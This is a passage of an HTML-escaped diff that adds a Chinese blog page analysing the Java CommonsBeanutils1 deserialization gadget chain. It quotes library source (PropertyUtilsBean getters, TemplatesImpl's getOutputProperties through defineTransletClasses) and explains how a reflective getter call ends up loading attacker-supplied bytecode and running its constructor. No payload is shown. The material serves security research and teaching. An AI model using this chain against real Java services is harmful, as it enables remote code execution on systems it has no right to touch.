+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> IllegalArgumentException(&lt;span style="color:#e6db74">&amp;#34;No bean specified&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> (name &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> IllegalArgumentException(&lt;span style="color:#e6db74">&amp;#34;No name specified for bean class &amp;#39;&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> bean.&lt;span style="color:#a6e22e">getClass&lt;/span>() &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#39;&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span>(&lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">resolver&lt;/span>.&lt;span style="color:#a6e22e">hasNested&lt;/span>(name)) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> String next &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">resolver&lt;/span>.&lt;span style="color:#a6e22e">next&lt;/span>(name);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Object nestedBean &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (bean &lt;span style="color:#66d9ef">instanceof&lt;/span> Map) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> nestedBean &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">getPropertyOfMapBean&lt;/span>((Map)bean, next);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">resolver&lt;/span>.&lt;span style="color:#a6e22e">isMapped&lt;/span>(next)) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> nestedBean &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">getMappedProperty&lt;/span>(bean, next);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">resolver&lt;/span>.&lt;span style="color:#a6e22e">isIndexed&lt;/span>(next)) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> nestedBean &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">getIndexedProperty&lt;/span>(bean, next);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> nestedBean &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">getSimpleProperty&lt;/span>(bean, next);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (nestedBean &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> NestedNullException(&lt;span style="color:#e6db74">&amp;#34;Null property value for &amp;#39;&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> name &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#39; on bean class &amp;#39;&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> bean.&lt;span style="color:#a6e22e">getClass&lt;/span>() &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#39;&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> bean &lt;span style="color:#f92672">=&lt;/span> nestedBean;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> name &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">resolver&lt;/span>.&lt;span style="color:#a6e22e">remove&lt;/span>(name);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (bean &lt;span style="color:#66d9ef">instanceof&lt;/span> Map) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> bean &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">getPropertyOfMapBean&lt;/span>((Map)bean, name);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">resolver&lt;/span>.&lt;span style="color:#a6e22e">isMapped&lt;/span>(name)) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> bean &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">getMappedProperty&lt;/span>(bean, name);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">resolver&lt;/span>.&lt;span style="color:#a6e22e">isIndexed&lt;/span>(name)) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> bean &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">getIndexedProperty&lt;/span>(bean, name);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> bean &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">getSimpleProperty&lt;/span>(bean, name);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> bean;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>在&lt;code>getSimpleProperty&lt;/code>方法内会通过反射获取到&lt;code>TemplatesImpl&lt;/code>对象&lt;code>property&lt;/code>对应的的getter方法并调用，在java规范中outputProperities对应的getter方法名应该为getOutputProperities&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> Object &lt;span style="color:#a6e22e">getSimpleProperty&lt;/span>(Object bean, String name) &lt;span style="color:#66d9ef">throws&lt;/span> IllegalAccessException, InvocationTargetException, NoSuchMethodException {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (bean &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> IllegalArgumentException(&lt;span style="color:#e6db74">&amp;#34;No bean specified&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> (name &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> IllegalArgumentException(&lt;span style="color:#e6db74">&amp;#34;No name specified for bean class &amp;#39;&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> bean.&lt;span style="color:#a6e22e">getClass&lt;/span>() &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#39;&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">resolver&lt;/span>.&lt;span style="color:#a6e22e">hasNested&lt;/span>(name)) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> IllegalArgumentException(&lt;span style="color:#e6db74">&amp;#34;Nested property names are not allowed: Property &amp;#39;&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> name &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#39; on bean class &amp;#39;&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> bean.&lt;span style="color:#a6e22e">getClass&lt;/span>() &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#39;&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">resolver&lt;/span>.&lt;span style="color:#a6e22e">isIndexed&lt;/span>(name)) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> IllegalArgumentException(&lt;span style="color:#e6db74">&amp;#34;Indexed property names are not allowed: Property &amp;#39;&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> name &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#39; on bean class &amp;#39;&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> bean.&lt;span style="color:#a6e22e">getClass&lt;/span>() &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#39;&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">resolver&lt;/span>.&lt;span style="color:#a6e22e">isMapped&lt;/span>(name)) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> IllegalArgumentException(&lt;span style="color:#e6db74">&amp;#34;Mapped property names are not allowed: Property &amp;#39;&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> name &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#39; on bean class &amp;#39;&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> bean.&lt;span style="color:#a6e22e">getClass&lt;/span>() &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#39;&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> (bean &lt;span style="color:#66d9ef">instanceof&lt;/span> DynaBean) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> DynaProperty descriptor &lt;span style="color:#f92672">=&lt;/span> ((DynaBean)bean).&lt;span style="color:#a6e22e">getDynaClass&lt;/span>().&lt;span style="color:#a6e22e">getDynaProperty&lt;/span>(name);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (descriptor &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> NoSuchMethodException(&lt;span style="color:#e6db74">&amp;#34;Unknown property &amp;#39;&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> name &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#39; on dynaclass &amp;#39;&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> ((DynaBean)bean).&lt;span style="color:#a6e22e">getDynaClass&lt;/span>() &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#39;&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> ((DynaBean)bean).&lt;span style="color:#a6e22e">get&lt;/span>(name);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> PropertyDescriptor descriptor &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">getPropertyDescriptor&lt;/span>(bean, name);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (descriptor &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> NoSuchMethodException(&lt;span style="color:#e6db74">&amp;#34;Unknown property &amp;#39;&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> name &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#39; on class &amp;#39;&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> bean.&lt;span style="color:#a6e22e">getClass&lt;/span>() &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#39;&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Method readMethod &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">getReadMethod&lt;/span>(bean.&lt;span style="color:#a6e22e">getClass&lt;/span>(), descriptor);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (readMethod &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> NoSuchMethodException(&lt;span style="color:#e6db74">&amp;#34;Property &amp;#39;&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> name &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#39; has no getter method in class &amp;#39;&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> bean.&lt;span style="color:#a6e22e">getClass&lt;/span>() &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#39;&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Object value &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">invokeMethod&lt;/span>(readMethod, bean, EMPTY_OBJECT_ARRAY);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> value;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
+&lt;img alt="" src="https://www.ch35tnut.site/images/research/web/java-deserialization/CommonsBeanutils1-chain.zh-cn.assets/5.png" />&lt;/p>
+&lt;p>&lt;code>TemplatesImpl&lt;/code>类中&lt;code>getOutputProperties&lt;/code>方法代码如下，会调用&lt;code>newTransformer&lt;/code>方法&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">synchronized&lt;/span> Properties &lt;span style="color:#a6e22e">getOutputProperties&lt;/span>() {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> newTransformer().&lt;span style="color:#a6e22e">getOutputProperties&lt;/span>();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">catch&lt;/span> (TransformerConfigurationException e) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">synchronized&lt;/span> Transformer &lt;span style="color:#a6e22e">newTransformer&lt;/span>()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">throws&lt;/span> TransformerConfigurationException
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> TransformerImpl transformer;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> transformer &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> TransformerImpl(getTransletInstance(), _outputProperties,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> _indentNumber, _tfactory);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (_uriResolver &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> transformer.&lt;span style="color:#a6e22e">setURIResolver&lt;/span>(_uriResolver);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (_tfactory.&lt;span style="color:#a6e22e">getFeature&lt;/span>(XMLConstants.&lt;span style="color:#a6e22e">FEATURE_SECURE_PROCESSING&lt;/span>)) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> transformer.&lt;span style="color:#a6e22e">setSecureProcessing&lt;/span>(&lt;span style="color:#66d9ef">true&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> transformer;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>newTransformer会调用getTransletInstance方法，在该方法内会调用defineTransletClasses方法，defineTransletClasses会读取_bytecodes并通过defineClass方法通过字节码加载成对应的类并构造对应的对象，所以这个过程会执行恶意类的构造方法。&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">private&lt;/span> Translet &lt;span style="color:#a6e22e">getTransletInstance&lt;/span>()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">throws&lt;/span> TransformerConfigurationException {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (_name &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>) &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (_class &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>) defineTransletClasses();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// The translet needs to keep a reference to all its auxiliary&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// class to prevent the GC from collecting them&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> AbstractTranslet translet &lt;span style="color:#f92672">=&lt;/span> (AbstractTranslet) _class&lt;span style="color:#f92672">[&lt;/span>_transletIndex&lt;span style="color:#f92672">]&lt;/span>.&lt;span style="color:#a6e22e">newInstance&lt;/span>();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> translet.&lt;span style="color:#a6e22e">postInitialization&lt;/span>();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> translet.&lt;span style="color:#a6e22e">setTemplates&lt;/span>(&lt;span style="color:#66d9ef">this&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> translet.&lt;span style="color:#a6e22e">setOverrideDefaultParser&lt;/span>(_overrideDefaultParser);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> translet.&lt;span style="color:#a6e22e">setAllowedProtocols&lt;/span>(_accessExternalStylesheet);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (_auxClasses &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> translet.&lt;span style="color:#a6e22e">setAuxiliaryClasses&lt;/span>(_auxClasses);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> translet;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">catch&lt;/span> (InstantiationException e) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ErrorMsg err &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> ErrorMsg(ErrorMsg.&lt;span style="color:#a6e22e">TRANSLET_OBJECT_ERR&lt;/span>, _name);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> TransformerConfigurationException(err.&lt;span style="color:#a6e22e">toString&lt;/span>());
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">catch&lt;/span> (IllegalAccessException e) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ErrorMsg err &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> ErrorMsg(ErrorMsg.&lt;span style="color:#a6e22e">TRANSLET_OBJECT_ERR&lt;/span>, _name);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> TransformerConfigurationException(err.&lt;span style="color:#a6e22e">toString&lt;/span>());
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">defineTransletClasses&lt;/span>()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">throws&lt;/span> TransformerConfigurationException {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (_bytecodes &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ErrorMsg err &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> ErrorMsg(ErrorMsg.&lt;span style="color:#a6e22e">NO_TRANSLET_CLASS_ERR&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> TransformerConfigurationException(err.&lt;span style="color:#a6e22e">toString&lt;/span>());
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> TransletClassLoader loader &lt;span style="color:#f92672">=&lt;/span> (TransletClassLoader)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> AccessController.&lt;span style="color:#a6e22e">doPrivileged&lt;/span>(&lt;span style="color:#66d9ef">new&lt;/span> PrivilegedAction() {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> Object &lt;span style="color:#a6e22e">run&lt;/span>() {
